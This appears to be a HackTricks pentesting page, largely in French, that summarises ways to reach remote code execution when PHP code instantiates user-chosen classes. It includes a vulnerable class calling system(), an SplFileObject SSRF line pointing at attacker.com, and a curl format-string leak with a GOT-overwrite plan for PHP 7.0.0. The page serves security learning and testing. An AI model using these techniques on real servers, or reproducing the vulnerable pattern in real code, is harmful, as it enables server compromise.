# PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

This is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introduction

La création de nouveaux objets arbitraires, comme `new $_GET["a"]($_GET["a"])`, peut conduire à Remote Code Execution (RCE), comme détaillé dans un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ce document met en lumière différentes stratégies pour obtenir une RCE.

## RCE via classes personnalisées ou autoloading

La syntaxe `new $a($b)` est utilisée pour instancier un objet où **`$a`** représente le nom de la classe et **`$b`** est le premier argument passé au constructeur. Ces variables peuvent provenir d'entrées utilisateur comme GET/POST, où elles peuvent être strings ou arrays, ou de JSON, où elles peuvent apparaître sous d'autres types.

Considérez l'extrait de code ci-dessous:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Dans cet exemple, définir `$a` sur `App` ou `App2` et `$b` sur une commande système (par ex., `uname -a`) entraîne l'exécution de cette commande.

**Les fonctions d'autochargement** peuvent être exploitées si aucune de ces classes n'est directement accessible. Ces fonctions chargent automatiquement des classes depuis des fichiers lorsque nécessaire et sont définies en utilisant `spl_autoload_register` ou `__autoload` :
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Le comportement de l'autoloading varie selon les versions de PHP, offrant différentes possibilités de RCE.

## RCE via classes intégrées

En l'absence de classes personnalisées ou d'autoloaders, **les classes PHP intégrées** peuvent suffire pour obtenir une RCE. Le nombre de ces classes varie entre 100 et 200, selon la version de PHP et les extensions. Elles peuvent être listées avec `get_declared_classes()`.

Les constructeurs intéressants peuvent être identifiés via l'API de reflection, comme montré dans l'exemple suivant et le lien [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via des méthodes spécifiques comprend :**

### **SSRF + Phar Deserialization**

La classe `SplFileObject` permet le SSRF via son constructeur, autorisant des connexions vers n'importe quelle URL :
```php
new SplFileObject('http://attacker.com/');
```
SSRF peut conduire à des attaques de désérialisation dans les versions de PHP antérieures à 8.0 en utilisant le protocole Phar.

### **Exploiter les PDOs**

Le constructeur de la classe PDO permet des connexions aux bases de données via des chaînes DSN, pouvant potentiellement permettre la création de fichiers ou d'autres interactions :
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versions de PHP jusqu'à 5.3.22 et 5.4.12 étaient susceptibles d'attaques XXE via les constructeurs `SoapClient` et `SimpleXMLElement`, en fonction de la version de libxml2.

## RCE via Imagick Extension

Lors de l'analyse des **dépendances d'un projet**, il a été découvert que **Imagick** pouvait être exploité pour une **exécution de commandes** en instanciant de nouveaux objets. Cela présente une opportunité d'exploiter des vulnérabilités.

### VID parser

La capacité du VID parser à écrire du contenu vers n'importe quel chemin spécifié dans le système de fichiers a été identifiée. Cela pourrait conduire au placement d'un PHP shell dans un répertoire accessible depuis le web, aboutissant à une Remote Code Execution (RCE).

#### VID Parser + File Upload

Il est noté que PHP stocke temporairement les fichiers uploadés dans /tmp/phpXXXXXX. Le VID parser d'Imagick, utilisant le protocole **msl**, peut gérer les wildcards dans les chemins de fichiers, facilitant le transfert du fichier temporaire vers un emplacement choisi. Cette méthode offre une approche supplémentaire pour obtenir une écriture de fichier arbitraire dans le système de fichiers.

### PHP Crash + Brute Force

A method described in the [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) involves uploading files that trigger a server crash before deletion. By brute-forcing the name of the temporary file, it becomes possible for Imagick to execute arbitrary PHP code. However, this technique was found to be effective only in an outdated version of ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Lorsqu'une entrée utilisateur contrôle le nom de classe (par ex., `new $_GET['model']()`), PHP 7.0.0 a introduit un bug transitoire lors du refactor de `Throwable` où le moteur traitait par erreur le nom de la classe comme une chaîne de format printf lors de la résolution. Cela permet les primitives classiques de style printf à l'intérieur de PHP : leaks avec `%p`, contrôle du compteur d'écriture avec des spécificateurs de largeur, et écritures arbitraires avec `%n` contre des pointeurs en processus (par exemple, les GOT entries sur les builds ELF).

Minimal repro vulnerable pattern:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Plan d'exploitation (d'après la référence) :
- Leak des adresses via `%p` dans le nom de classe pour trouver une cible écrivable :
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Utiliser des paramètres positionnels et des spécificateurs de largeur pour définir un nombre exact d'octets, puis `%n` pour écrire cette valeur à une adresse accessible sur la stack, en visant une entrée GOT (par ex., `free`) pour l'écraser partiellement vers `system`.
- Déclencher la fonction détournée en passant un nom de classe contenant un shell pipe pour atteindre `system("id")`.

Remarques :
- Fonctionne uniquement sur PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)) ; corrigé dans les versions suivantes. Gravité : critique si une instanciation de classe arbitraire est possible.
- Les payloads typiques enchaînent de nombreux `%p` pour parcourir la stack, puis `%.<width>d%<pos>$n` pour effectuer l'écrasement partiel.

## Références

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
